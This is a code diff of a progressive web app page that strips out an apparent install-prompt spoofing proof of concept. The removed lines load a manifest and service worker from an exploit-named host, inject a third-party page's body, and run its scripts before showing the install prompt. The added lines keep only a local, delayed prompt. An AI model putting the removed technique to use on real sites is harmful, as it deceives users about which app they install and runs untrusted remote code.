@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>My PWA App</title>
-    <link rel="manifest" href="https://0x1337-exploit.github.io/hosting/pwa/manifest.json">
+    <link rel="manifest" href="manifest.json">
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
         button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
@@ -25,71 +25,27 @@
             document.getElementById('installButton').style.display = 'block'; // Show the install button
         });
 
-        // Handle button click: Simulate redirect first, then delay and prompt
-        document.getElementById('installButton').addEventListener('click', async () => {
+        // Handle button click with 3-second delay
+        document.getElementById('installButton').addEventListener('click', () => {
             if (deferredPrompt) {
-                // Step 1: Fetch the new page content
-                try {
-                    const targetUrl = 'https://permission.site/'; // Replace with your cross-origin or same-origin URL
-                    const response = await fetch(targetUrl, { mode: 'cors' }); // Explicit CORS mode
-                    if (!response.ok) throw new Error(`Fetch failed: ${response.status} ${response.statusText}`);
-                    const html = await response.text();
-
-                    // Step 2: Parse the new HTML and extract body content + scripts
-                    const parser = new DOMParser();
-                    const newDoc = parser.parseFromString(html, 'text/html');
-                    const newBodyContent = newDoc.body.innerHTML;
-
-                    // Step 3: Inject new body content (replaces current body)
-                    document.body.innerHTML = newBodyContent;
-
-                    // Step 4: Extract and execute any <script> tags from the new page (if needed)
-                    const scripts = newDoc.querySelectorAll('script');
-                    scripts.forEach(script => {
-                        const newScript = document.createElement('script');
-                        if (script.src) {
-                            newScript.src = script.src; // Might need full URL if relative
+                setTimeout(() => {
+                    deferredPrompt.prompt(); // Show the install prompt after delay
+                    deferredPrompt.userChoice.then((choiceResult) => {
+                        if (choiceResult.outcome === 'accepted') {
+                            console.log('User accepted the install prompt');
                         } else {
-                            newScript.textContent = script.textContent;
+                            console.log('User dismissed the install prompt');
                         }
-                        document.head.appendChild(newScript).onerror = (err) => console.error('Script load failed:', err);
+                        deferredPrompt = null; // Reset the prompt
                     });
-
-                    // Step 5: Simulate URL change ONLY if same-origin
-                    const currentOrigin = window.location.origin;
-                    const targetOrigin = new URL(targetUrl).origin;
-                    if (currentOrigin === targetOrigin) {
-                        history.pushState({}, '', targetUrl); // Safe for same-origin
-                        console.log('pushState successful');
-                    } else {
-                        console.warn('Skipping pushState: Cross-origin URL change not allowed.');
-                    }
-
-                    // Now the "redirect" is done, delay and show prompt
-                    setTimeout(() => {
-                        deferredPrompt.prompt(); // Show the install prompt after delay
-                        deferredPrompt.userChoice.then((choiceResult) => {
-                            if (choiceResult.outcome === 'accepted') {
-                                console.log('User accepted the install prompt');
-                            } else {
-                                console.log('User dismissed the install prompt');
-                            }
-                            deferredPrompt = null; // Reset the prompt
-                        });
-                    }, 3000); // 3-second delay
-                } catch (error) {
-                    console.error('Simulated redirect failed:', error);
-                    if (error.name === 'TypeError' && error.message.includes('cors')) {
-                        console.error('CORS issue: The target server must allow fetches from your origin.');
-                    }
-                }
+                }, 3000); // 3-second delay (3000 ms)
             }
         });
 
         // Register the service worker
         if ('serviceWorker' in navigator) {
             window.addEventListener('load', () => {
-                navigator.serviceWorker.register('https://0x1337-exploit.github.io/hosting/pwa/sw.js')
+                navigator.serviceWorker.register('/sw.js')
                     .then(reg => console.log('Service Worker registered', reg))
                     .catch(err => console.log('Service Worker registration failed', err));
             });
